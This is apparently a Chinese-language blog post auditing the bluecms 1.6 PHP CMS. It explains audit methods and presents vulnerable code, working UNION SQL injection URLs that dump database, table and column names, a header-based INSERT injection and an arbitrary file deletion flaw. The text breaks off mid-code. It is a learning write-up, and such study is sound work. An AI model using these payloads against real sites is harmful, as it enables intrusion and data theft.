<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="代码审计"><meta name="keywords" content="代码审计"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>代码审计--bluecms1.6 | Somnus's blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#全局分析"><span class="toc-number">2.</span> <span class="toc-text">全局分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞挖掘"><span class="toc-number">3.</span> <span class="toc-text">漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-跟踪输入变量"><span class="toc-number">3.1.</span> <span class="toc-text">1.跟踪输入变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-通过工具审计漏洞"><span class="toc-number">3.2.</span> <span class="toc-text">2.通过工具审计漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-搜索危险函数"><span class="toc-number">3.3.</span> <span class="toc-text">3.搜索危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-借鉴别人的文章"><span class="toc-number">3.4.</span> <span class="toc-text">4.借鉴别人的文章</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-UNION注入"><span class="toc-number">4.1.</span> <span class="toc-text">1.UNION注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-INSERT-INTO注入"><span class="toc-number">4.2.</span> <span class="toc-text">2.INSERT INTO注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-任意文件跳转漏洞"><span class="toc-number">4.3.</span> <span class="toc-text">3.任意文件跳转漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-任意文件删除漏洞"><span class="toc-number">4.4.</span> <span class="toc-text">4.任意文件删除漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-反射型XSS"><span class="toc-number">4.5.</span> <span class="toc-text">5.反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-存储型XSS"><span class="toc-number">4.6.</span> <span class="toc-text">6.存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-任意文件包含漏洞"><span class="toc-number">4.7.</span> <span class="toc-text">7.任意文件包含漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">79</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">15</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">25</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">代码审计--bluecms1.6</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-13</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>记录bluecms1.6审计过程以及漏洞分析<a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>笔者属于新手，刚接触审计不久，刚拿到一个完全陌生的cms，一开始完全不知道如何下手，所以我通过不断阅读别人的审计文章，重点观察别人的审计思路，一开始看别人的审计文章其实不应该关注这个cms到底有什么漏洞，因为那都是别人已经审计好了的，你应该重点关注别人到底是怎么挖到这个洞的，这样你才能锻炼独立审计的能力，这篇文章我也会把我审计的全过程思路分享出来。</p>
<h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>首先拿到这个bluecms，安装完成后，我首先观察整个cms的文件结构</p>
<p><img src="../../../../img/bluecms/1.png" alt=""></p>
<p>其实每个文件夹的功能从名字就大概能猜出，比如<code>/admin</code>肯定是后台管理员才能访问进行管理的；<code>/include</code>肯定是用来包含的全局文件，例如一些函数定义的文件，一些数据库配置，过滤文件等等；<code>/templates</code>肯定是一些模板文件，看到这个文件夹就能猜到这里面放着的都是一些html模板，用来通过后台进行渲染的。当然这都是初步的大致浏览，具体还要等到后面访问页面才知道。</p>
<p>下面，浏览了网页结构，就开始审计具体文件了，那么问题来了，审计哪个呢，这么多文件。这里我的思路还是首先访问根目录下的<code>index.php</code>文件，因为它是整个网站的首页。</p>
<p>先来看看首页的代码：</p>
<p><img src="../../../../img/bluecms/2.png" alt=""></p>
<p>好多，将近300行，肯定不可能一行行的看，这里我首先还是先看主页面的开头包含了什么文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'include/common.inc.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/index.fun.php'</span>);</span><br></pre></td></tr></table></figure>

<p>前面说到<code>/include</code>文件夹，果然就包含了里面的文件，这些文件往往对我们审计过程都非常重要，一定要重视</p>
<p>先来看看<code>include/common.inc.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#30-36行</span></span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">	$_POST = deep_addslashes($_POST);</span><br><span class="line">	$_GET = deep_addslashes($_GET);</span><br><span class="line">	$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">	$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们马上就发现了在30-36行处，对全局数组POST，GET，COOKIES，REQUEST都进行了转义处理，所以只要通过这些方式输入的数据中存在单引号，双引号都会被转义。这就是为什么强调开头这些包含文件的重要性，如果我们没看到，就忽略了这些过滤，后面例如sql注入的注入点被单引号包裹，我们不知道有过滤还以为可以进行注入</p>
<p>另外在24-28行处还包含了一些函数文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> (BLUE_ROOT.<span class="string">'include/common.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/cat.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/cache.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/user.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/index.fun.php'</span>);</span><br></pre></td></tr></table></figure>

<p>后面遇到看不懂的函数，可以通过跟踪函数名在这些文件中搜索</p>
<p>就这样大致浏览一下这些文件的开头部分，后面其实大多都是功能部分，我们有的其实都不用去关注，毕竟我们本来就不可能每行都去看一遍</p>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="1-跟踪输入变量"><a href="#1-跟踪输入变量" class="headerlink" title="1.跟踪输入变量"></a>1.跟踪输入变量</h3><p>笔者一开始审计，也是很盲目，看了半天代码，还是看不出哪儿存在漏洞，主要一个原因还是代码太多了。所以感觉挖掘漏洞，还是要有方法，有明确思路，这样才能有效快速。在我浏览别人的审计文章时，看到了一句话：“有输入的地方就可能存在漏洞”。这句话讲的很有道理，这么多的web漏洞，本质上都是存在用户的输入才导致的，所以，我一开始就是关注每个文件哪里存在用户的输入。</p>
<p>从根目录开始，按顺序我们先来看看<code>ad_js.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure>

<p>文件很短，我们可以一口气将它看完，开头就有我们可以通过GET方式进行控制的变量，继续看下去，我们马上就看到了一个sql查询语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br></pre></td></tr></table></figure>

<p>在前面我们说过，在<code>common.inc.php</code>文件中对我们的输入方式进行转义的过滤，我们注意到这个文件开头就包含了它，说明这里对<strong>$ad_id</strong>变量是存在转义处理的，但是这里的sql语句中<strong>$ad_id</strong>是没有单引号包裹的，所以我们根本不需要去关注过滤，很明显这里就存在了sql注入漏洞，具体利用后面在一起说</p>
<p>接下来是<code>ann.php</code>文件，这个文件就有点长，但是我们无需关心，只看开头有没有可以利用的变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ann_id = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'ann_id'</span>]) ? intval($_REQUEST[<span class="string">'ann_id'</span>]) : <span class="string">''</span>;</span><br><span class="line">$cid = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'cid'</span>]) ? intval($_REQUEST[<span class="string">'cid'</span>]) : <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里虽然输入变量，但是经过了<strong>intval</strong>函数的过滤处理，所以我们无法利用，这个文件我们就先pass掉，就这个道理继续往下看</p>
<p>来到<code>user.php</code>文件，存在可利用的变量$from和$act：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$act = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'act'</span>]) ? trim($_REQUEST[<span class="string">'act'</span>]) : <span class="string">'default'</span>;</span><br><span class="line">$from = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'from'</span>]) ? $_REQUEST[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br></pre></td></tr></table></figure>

<p>这个文件也很长，我们直接搜索关键字跟踪变量<strong>$from</strong>，发现大多数做为参数传入了<strong>showmsg</strong>函数，例如112行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmsg(<span class="string">'欢迎您 '</span>.$user_name.<span class="string">' 回来，现在将转到...'</span>, $from);</span><br></pre></td></tr></table></figure>

<p>我们可以大致猜到这个函数是用来进行页面跳转的，具体我们可以跟踪这个函数，这里我在<strong>seay审计系统</strong>中进行内容全局搜索<code>function showmsg</code>，查询结果在<code>/include/common.fun.php</code>文件中对这个函数进行了定义，审计该文件中的这个函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showmsg</span><span class="params">($msg,$gourl=<span class="string">'goback'</span>, $is_write = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 	<span class="keyword">global</span> $smarty;</span><br><span class="line"> 	$smarty-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line"> 	$smarty-&gt;assign(<span class="string">"msg"</span>,$msg);</span><br><span class="line"> 	$smarty-&gt;assign(<span class="string">"gourl"</span>,$gourl);</span><br><span class="line"> 	$smarty-&gt;display(<span class="string">"showmsg.htm"</span>);</span><br><span class="line"> 	<span class="keyword">if</span>($is_write)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		write_log($msg, $_SESSION[<span class="string">'admin_name'</span>]);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面又利用了两个函数<strong>assign</strong>和<strong>display</strong>，同样继续跟踪这两个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_array($tpl_var))&#123;</span><br><span class="line">          <span class="keyword">foreach</span> ($tpl_var <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">              <span class="keyword">if</span> ($key != <span class="string">''</span>) &#123;</span><br><span class="line">                  <span class="keyword">$this</span>-&gt;_tpl_vars[$key] = $val;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">              <span class="keyword">$this</span>-&gt;_tpl_vars[$tpl_var] = $value;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($resource_name, $cache_id = null, $compile_id = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;fetch($resource_name, $cache_id, $compile_id, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>assign函数作用是将第二个参数作为键值，第一个参数作为键名。至于display函数，跟踪fetch函数有点长，这里我没有很详细的去看（其实是看不太懂…），只知道大致功能就是跳转页面。然后整个showmsg功能就是将assign中的数据渲染到display中的html页面。而这里传入参数<strong>$from</strong>，我们就可以猜测，可以通过该参数进行任意页面跳转的作用</p>
<p>依次类推，通过这个方法，相信只要耐心足够，一定很容易可以挖到一些漏洞</p>
<h3 id="2-通过工具审计漏洞"><a href="#2-通过工具审计漏洞" class="headerlink" title="2.通过工具审计漏洞"></a>2.通过工具审计漏洞</h3><p>第一种方法只是粗略的审计，一定还会有我们疏忽的漏洞，所以第二种方法，我用了审计工具来帮助我们进行审计，这里使用<strong>Seay审计系统</strong>，个人觉得还是不错的一款工具，还能进行关键字全局搜索。当然工具只是帮你分析可能存在的漏洞，并不是决定，具体我们还得一个个去耐心分析</p>
<p><img src="../../../../img/bluecms/3.png" alt=""></p>
<p>可以看到，工具审计非常多可能存在的漏洞，但我还是按照第一种方法的思想，找存在输入的点，这样能更高效的寻找漏洞</p>
<p><img src="../../../../img/bluecms/4.png" alt=""></p>
<p>例如上图，我们发现了变量<code>$ip</code>是通过头部的IP字段获取的，在这个字段我们是不用去关心转义过滤的，是个非常好利用的变量，所以我们赶紧跟踪<code>/include/common.fun.php</code>这个文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">	&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123; </span><br><span class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现这个关键函数<strong>getip</strong>，它返回的变量$ip我们是可以利用的，继续搜索这个函数getip，看看哪里可以利用到</p>
<p><img src="../../../../img/bluecms/5.png" alt=""></p>
<p>发现<code>/comment.php</code>文件中存在通过该函数拼接而成的sql语句，猜测就可能存在sql注入漏洞，跟踪该文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'comment'</span>).<span class="string">" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> 			VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"</span>.getip().<span class="string">"', '$is_check')"</span>;</span><br></pre></td></tr></table></figure>

<p>在113-114行找到了拼接的sql语句，我们可以通过伪造头部<code>X-Forwarded-For</code>字段来进行sql注入</p>
<p>依次类推，通过工具帮助我们审计，也能挖掘到更多漏洞</p>
<h3 id="3-搜索危险函数"><a href="#3-搜索危险函数" class="headerlink" title="3.搜索危险函数"></a>3.搜索危险函数</h3><p>第三种方法，我们还可以搜索一些导致漏洞的危险函数，例如<strong>unlink</strong>，<strong>include</strong>，<strong>move_uploaded_file</strong>函数等，这里搜索<strong>unlink</strong>函数为例</p>
<p><img src="../../../../img/bluecms/6.png" alt=""></p>
<p>搜索结果显示出非常多unlink函数中存在我们可以输入进行控制的变量，例如<code>/user.php</code>下的616行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (file_exists(BLUE_ROOT.$_POST[&apos;lit_pic&apos;])) &#123;</span><br><span class="line">		@unlink(BLUE_ROOT.$_POST[&apos;lit_pic&apos;]);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>就存在可以利用的变量<code>$_POST[&#39;lit_pic&#39;]</code>，我们跟踪该变量，发现除了开头包含文件的转义处理以外，无其他过滤地方，很明显我们就可以利用该变量进行网站根目录下任意文件删除的操作</p>
<h3 id="4-借鉴别人的文章"><a href="#4-借鉴别人的文章" class="headerlink" title="4.借鉴别人的文章"></a>4.借鉴别人的文章</h3><p>一开始审计，难免会有很多漏洞自己忽略掉没审计到，这时候我们就需要多去参考别人审计该cms的文章，寻找出自己未审计出的漏洞，并总结自己为什么没有找出该漏洞，这样就为下次审计积累更多的经验</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-UNION注入"><a href="#1-UNION注入" class="headerlink" title="1.UNION注入"></a>1.UNION注入</h3><p><code>/ad_js.php</code>第19行通过变量<code>$ad_id</code>拼接的sql语句由于变量<code>$ad_id</code>未进行过滤并且无引号包裹，存在SQL注入漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--\r\ndocument.write(\""</span>.$ad_content.<span class="string">"\");\r\n--&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure>

<p>有回馈信息，所以我们直接用<strong>union注入</strong></p>
<p>首先通过<strong>order by</strong>测试查询字段数为7，然后通过测试得知回显字段在第6位</p>
<p>注数据库payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=0%20union%20select%200,0,0,0,0,database(),0</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/bluecms/7.png" alt=""></p>
<p>注表名payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ad_js.php?ad_id=0%20union%20select%200,0,0,0,0,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/bluecms/8.png" alt=""></p>
<p>注blue_ad表下的列名payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=0%20union%20select%200,0,0,0,0,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x626c75655f6164),0</span><br></pre></td></tr></table></figure>

<p>注意将<strong>blue_ad</strong>转化为十六进制</p>
<p><img src="../../../../img/bluecms/9.png" alt=""></p>
<h3 id="2-INSERT-INTO注入"><a href="#2-INSERT-INTO注入" class="headerlink" title="2.INSERT INTO注入"></a>2.INSERT INTO注入</h3><p><code>/include/common.fun.php</code>下<strong>getip()</strong>函数返回存在通过头部IP字段获取的变量，跟踪该函数发现<code>comment.php</code>下第113行可利用getip()获取的可控变量进行sql注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">			VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br></pre></td></tr></table></figure>

<p>这是一个添加评论功能的页面，功能整体代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'send'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($id))</span><br><span class="line">	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line"> 	$user_id = $_SESSION[<span class="string">'user_id'</span>] ? $_SESSION[<span class="string">'user_id'</span>] : <span class="number">0</span>;</span><br><span class="line"> 	$mood = intval($_POST[<span class="string">'mood'</span>]);</span><br><span class="line"> 	$content = !<span class="keyword">empty</span>($_POST[<span class="string">'comment'</span>]) ? htmlspecialchars($_POST[<span class="string">'comment'</span>]) : <span class="string">''</span>;</span><br><span class="line"> 	$content = nl2br($content);</span><br><span class="line"> 	$type = intval($_POST[<span class="string">'type'</span>]);</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="keyword">empty</span>($content))</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		showmsg(<span class="string">'评论内容不能为空'</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">if</span>($_CFG[<span class="string">'comment_is_check'</span>] == <span class="number">0</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		$is_check = <span class="number">1</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">else</span></span><br><span class="line"> 	&#123;</span><br><span class="line"> 		$is_check = <span class="number">0</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line"> 	$sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'comment'</span>).<span class="string">" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> 			VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"</span>.getip().<span class="string">"', '$is_check')"</span>;</span><br><span class="line"> 	$db-&gt;query($sql);</span><br><span class="line"> 	<span class="keyword">if</span>($type == 